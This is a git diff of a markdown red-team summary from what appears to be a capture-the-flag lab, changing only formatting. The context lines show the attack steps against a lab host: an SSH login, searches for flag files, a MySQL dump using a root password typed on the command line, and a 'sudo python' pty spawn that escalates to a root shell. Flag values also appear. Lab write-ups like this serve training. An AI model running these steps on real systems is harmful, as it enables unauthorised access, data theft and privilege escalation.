@@ -1,5 +1,4 @@
 # Red Team: Summary of Operations
-
 ## Table of Contents
 - Exposed Services
 - Exploitation
@@ -29,9 +28,9 @@ The following vulnerabilities were identified on each target:
   - Misconfiguration of user privileges leading to privilege escalation
 
 ### Exploitation
-
 The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
 
+-----
 ### `flag1`: b9bbcb33ellb80be759c4e844862482d
 
 #### Exploits Used 
@@ -76,7 +75,7 @@ $ ssh michael@192.168.1.110
 ```
 $ grep -rnw / -e “flag1” 2> /dev/null
 ```
-
+-----
 ### `flag2`: fc3fd58dcdad9ab23faca6e9a3e581c
 
 #### Exploit Used
@@ -90,7 +89,7 @@ $ find / -iname “flag2*” 2> /dev/null
 ```
 cat /var/www/flag2.txt
 ```
-
+-----
 ### `flag3`: afc01ab56b50591e7dccf93122770cd2
 
 #### Exploit Used
@@ -106,8 +105,9 @@ $ mysqldump wordpress -u root -pR@v3nSecurity > dump
 $ grep “flag3” dump
 ```
 
-Note: flag4 is located here as well
+Note: flag4 was found here in addition to the next step
 
+-----
 ### `flag4`: 715dea6c055b9fe3337544932f2941ce
 
 #### Exploit Used
@@ -142,6 +142,6 @@ sudo -l
 ```
 sudo python -c 'import pty;pty.spawn("/bin/bash")'
 ```
-
+-----
 
 
